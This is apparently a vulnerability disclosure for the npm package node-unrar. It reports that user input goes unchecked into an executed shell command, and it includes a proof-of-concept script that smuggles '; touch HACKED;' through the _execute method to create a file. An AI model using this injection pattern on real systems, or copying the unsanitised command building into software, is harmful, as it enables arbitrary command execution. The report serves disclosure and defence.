# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

1. Create the following PoC file:

```js
// poc.js
var Unrar = require("node-unrar");
var rar = new Unrar("/path/to/file.rar");

rar._execute([], "; touch HACKED;", function () {});
```

2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:

```bash
npm i node-unrar # Install affected module
node poc.js #  Run the PoC
```

4. Recheck the files: now `HACKED` has been created
